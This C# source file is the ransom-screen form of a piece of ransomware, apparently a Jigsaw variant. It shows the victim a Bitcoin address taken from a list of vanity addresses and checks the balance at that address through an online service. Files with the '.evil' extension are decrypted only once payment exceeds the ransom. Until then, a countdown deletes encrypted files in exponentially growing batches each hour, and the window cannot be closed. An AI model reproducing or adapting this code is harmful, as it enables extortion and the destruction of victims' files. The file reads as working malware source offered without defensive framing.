using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Main.Properties;
using Main.Tools;

namespace Main
{
	public class FormGame : Form
	{
		private static int _timeLeftSec;

		private static int _exponent;

		private const double Base = 1.1;

		private static int _indexNum;

		private IContainer components;

		private Label labelWelcome;

		private Timer timerTypingEffect;

		private Label labelTask;

		private TextBox textBoxAddress;

		private Button buttonCheckPayment;

		private Button buttonViewEncryptedFiles;

		private Timer timerCountDown;

		private Label labelCountDown;

		private Label labelFilesToDelete;

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		public FormGame()
		{
			InitializeComponent();
		}

		private void FormGame_Load(object sender, EventArgs e)
		{
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.StartPosition = FormStartPosition.CenterScreen;
			Main.Tools.Windows.MakeTopMost(this);
			timerTypingEffect.Interval = 125;
			timerTypingEffect.Enabled = true;
			labelWelcome.Text = "";
			labelTask.Text = Config.TaskMessage;
			labelTask.Visible = false;
			textBoxAddress.ReadOnly = true;
			textBoxAddress.Text = GetBitcoinAddess();
			textBoxAddress.Visible = false;
			buttonCheckPayment.Visible = false;
			buttonViewEncryptedFiles.Visible = false;
			labelCountDown.Visible = false;
			timerCountDown.Enabled = false;
			labelFilesToDelete.Visible = false;
			if (DidRun())
			{
				DeleteFiles(1000);
			}
		}

		private static bool DidRun()
		{
			string path = Path.Combine(Config.WorkFolderPath, "dr");
			if (File.Exists(path))
			{
				return true;
			}
			File.WriteAllText(path, "21");
			return false;
		}

		private static void DeleteFiles(int num)
		{
			try
			{
				int num2 = 0;
				foreach (string encryptedFile in Locker.GetEncryptedFiles())
				{
					if (num2 == num)
					{
						break;
					}
					File.Delete(encryptedFile + ".evil");
					num2++;
				}
			}
			catch (Exception)
			{
			}
		}

		private static string GetBitcoinAddess()
		{
			string path = Path.Combine(Config.WorkFolderPath, "Address.txt");
			if (File.Exists(path))
			{
				return File.ReadAllText(path);
			}
			HashSet<string> hashSet = new HashSet<string>();
			foreach (string item in Resources.vanityAddresses.Split(new string[1]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries).ToList())
			{
				hashSet.Add(item.Trim());
			}
			string text = hashSet.OrderBy((string x) => Guid.NewGuid()).FirstOrDefault();
			File.WriteAllText(path, text);
			return text;
		}

		private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
			MessageBox.Show(this, "Vous pensez que vous pouvez vous en sortir comme ça ?");
		}

		private void timerTypingEffect_Tick(object sender, EventArgs e)
		{
			string welcomeMessage = Config.WelcomeMessage;
			labelWelcome.Text = welcomeMessage.Substring(0, _indexNum) + "_";
			_indexNum++;
			if (_indexNum == welcomeMessage.Length + 1)
			{
				timerTypingEffect.Enabled = false;
				labelTask.Visible = true;
				textBoxAddress.Visible = true;
				buttonCheckPayment.Visible = true;
				buttonViewEncryptedFiles.Visible = true;
				labelCountDown.Visible = true;
				timerCountDown.Enabled = true;
				labelFilesToDelete.Visible = true;
				_timeLeftSec = 3600;
			}
		}

		private void buttonCheckPayment_Click(object sender, EventArgs e)
		{
			try
			{
				double price = Blockr.GetPrice();
				int num = (int)(Blockr.GetBalanceBtc(GetBitcoinAddess()) * price);
				if (num > Config.RansomUsd)
				{
					timerCountDown.Stop();
					buttonCheckPayment.Enabled = false;
					buttonCheckPayment.BackColor = Color.Lime;
					buttonCheckPayment.Text = "Arg, vous nous avez eu...";
					MessageBox.Show(this, "Déchiffrement de vos fichiers. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
					Locker.DecryptFiles(".evil");
					Hacking.RemoveItself();
				}
				else if (num > 0)
				{
					buttonCheckPayment.BackColor = Color.Tomato;
					buttonCheckPayment.Text = "You did not sent me enough! Try again!";
				}
				else
				{
					buttonCheckPayment.BackColor = Color.Tomato;
					buttonCheckPayment.Text = "You haven't made payment yet! Try again!";
				}
			}
			catch
			{
				buttonCheckPayment.Text = "Are you connected to the internet? Try again!";
				buttonCheckPayment.BackColor = Color.Tomato;
			}
		}

		private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
		{
			new FormEncryptedFiles().Show(this);
		}

		private void timerCountDown_Tick(object sender, EventArgs e)
		{
			if (_timeLeftSec > 0)
			{
				_timeLeftSec--;
				int num = _timeLeftSec / 60;
				int num2 = _timeLeftSec % 60;
				labelCountDown.Text = num + ":" + num2;
			}
			else
			{
				_timeLeftSec = 3600;
				int num3 = (int)Math.Pow(1.1, _exponent);
				labelFilesToDelete.Text = num3 + " sont supprimés";
				_exponent++;
				DeleteFiles(num3);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			labelWelcome = new System.Windows.Forms.Label();
			timerTypingEffect = new System.Windows.Forms.Timer(components);
			labelTask = new System.Windows.Forms.Label();
			textBoxAddress = new System.Windows.Forms.TextBox();
			buttonCheckPayment = new System.Windows.Forms.Button();
			buttonViewEncryptedFiles = new System.Windows.Forms.Button();
			timerCountDown = new System.Windows.Forms.Timer(components);
			labelCountDown = new System.Windows.Forms.Label();
			labelFilesToDelete = new System.Windows.Forms.Label();
			SuspendLayout();
			labelWelcome.AutoSize = true;
			labelWelcome.BackColor = System.Drawing.Color.Black;
			labelWelcome.Font = new System.Drawing.Font("Lucida Console", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			labelWelcome.ForeColor = System.Drawing.Color.Lime;
			labelWelcome.Location = new System.Drawing.Point(25, 29);
			labelWelcome.Name = "labelWelcome";
			labelWelcome.Size = new System.Drawing.Size(128, 16);
			labelWelcome.TabIndex = 0;
			labelWelcome.Text = "Evil Country";
			timerTypingEffect.Tick += new System.EventHandler(timerTypingEffect_Tick);
			labelTask.AutoSize = true;
			labelTask.BackColor = System.Drawing.Color.Black;
			labelTask.Font = new System.Drawing.Font("Lucida Console", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			labelTask.ForeColor = System.Drawing.Color.Lime;
			labelTask.Location = new System.Drawing.Point(12, 379);
			labelTask.Name = "labelTask";
			labelTask.Size = new System.Drawing.Size(239, 16);
			labelTask.TabIndex = 1;
			labelTask.Text = "All you have to do...";
			textBoxAddress.Location = new System.Drawing.Point(12, 409);
			textBoxAddress.Name = "textBoxAddress";
			textBoxAddress.Size = new System.Drawing.Size(261, 20);
			textBoxAddress.TabIndex = 2;
			textBoxAddress.Text = "EvilCoinPayment";
			buttonCheckPayment.BackColor = System.Drawing.Color.Gold;
			buttonCheckPayment.Location = new System.Drawing.Point(12, 435);
			buttonCheckPayment.Name = "buttonCheckPayment";
			buttonCheckPayment.Size = new System.Drawing.Size(348, 33);
			buttonCheckPayment.TabIndex = 3;
			buttonCheckPayment.Text = "J'ai payé, je veux retrouver mes fichiers svp";
			buttonCheckPayment.UseVisualStyleBackColor = false;
			buttonCheckPayment.Click += new System.EventHandler(buttonCheckPayment_Click);
			buttonViewEncryptedFiles.BackColor = System.Drawing.Color.Gray;
			buttonViewEncryptedFiles.Location = new System.Drawing.Point(12, 333);
			buttonViewEncryptedFiles.Name = "buttonViewEncryptedFiles";
			buttonViewEncryptedFiles.Size = new System.Drawing.Size(239, 23);
			buttonViewEncryptedFiles.TabIndex = 4;
			buttonViewEncryptedFiles.Text = "View encrypted files";
			buttonViewEncryptedFiles.UseVisualStyleBackColor = false;
			buttonViewEncryptedFiles.Click += new System.EventHandler(buttonViewEncryptedFiles_Click);
			timerCountDown.Interval = 1000;
			timerCountDown.Tick += new System.EventHandler(timerCountDown_Tick);
			labelCountDown.AutoSize = true;
			labelCountDown.BackColor = System.Drawing.Color.Black;
			labelCountDown.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
			labelCountDown.Font = new System.Drawing.Font("Lucida Sans Unicode", 48f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			labelCountDown.ForeColor = System.Drawing.Color.DarkRed;
			labelCountDown.Location = new System.Drawing.Point(591, 379);
			labelCountDown.Name = "labelCountDown";
			labelCountDown.Size = new System.Drawing.Size(220, 80);
			labelCountDown.TabIndex = 5;
			labelCountDown.Text = "59:59";
			labelFilesToDelete.AutoSize = true;
			labelFilesToDelete.BackColor = System.Drawing.Color.Black;
			labelFilesToDelete.Font = new System.Drawing.Font("Lucida Console", 12f, System.Drawing.FontStyle.Bold);
			labelFilesToDelete.ForeColor = System.Drawing.Color.Lime;
			labelFilesToDelete.Location = new System.Drawing.Point(25, 63);
			labelFilesToDelete.Name = "labelFilesToDelete";
			labelFilesToDelete.Size = new System.Drawing.Size(217, 16);
			labelFilesToDelete.TabIndex = 6;
			labelFilesToDelete.Text = "1 seront supprimés.";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackgroundImage = Main.Properties.Resources.Jigsaw;
			base.ClientSize = new System.Drawing.Size(840, 596);
			base.Controls.Add(labelFilesToDelete);
			base.Controls.Add(labelCountDown);
			base.Controls.Add(buttonViewEncryptedFiles);
			base.Controls.Add(buttonCheckPayment);
			base.Controls.Add(textBoxAddress);
			base.Controls.Add(labelTask);
			base.Controls.Add(labelWelcome);
			base.Name = "FormGame";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormGame_FormClosing);
			base.Load += new System.EventHandler(FormGame_Load);
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
